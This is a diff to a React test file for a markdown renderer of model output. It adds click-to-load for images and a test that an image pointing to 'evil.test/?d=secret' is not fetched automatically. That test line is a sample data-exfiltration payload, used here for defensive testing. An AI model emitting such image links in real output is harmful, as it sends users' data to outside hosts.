@@ -2,11 +2,21 @@ import { render, fireEvent, cleanup } from '@testing-library/react'
 import { describe, it, expect, afterEach } from 'vitest'
 import { RenderMarkdown } from '../RenderMarkdown'
 
+const loadImage = () =>
+  fireEvent.click(document.querySelector('button')!)
+
 afterEach(cleanup)
 
 describe('RenderMarkdown images and links', () => {
+  it('does not fetch an https image until the user clicks to load it', () => {
+    render(<RenderMarkdown content={'![x](https://evil.test/?d=secret)'} />)
+    expect(document.querySelector('img')).toBeNull()
+    expect(document.querySelector('button')).not.toBeNull()
+  })
+
   it('draws an https image from model output, lazily and without a referrer', () => {
     render(<RenderMarkdown content={'![Ugly Love](https://i.test/ugly-love.jpg)'} />)
+    loadImage()
     const img = document.querySelector('img')
     expect(img?.getAttribute('src')).toBe('https://i.test/ugly-love.jpg')
     expect(img?.getAttribute('alt')).toBe('Ugly Love')
@@ -21,6 +31,7 @@ describe('RenderMarkdown images and links', () => {
 
   it('removes an image that fails to load', () => {
     render(<RenderMarkdown content={'![x](https://i.test/dead.jpg)'} />)
+    loadImage()
     fireEvent.error(document.querySelector('img')!)
     expect(document.querySelector('img')).toBeNull()
   })
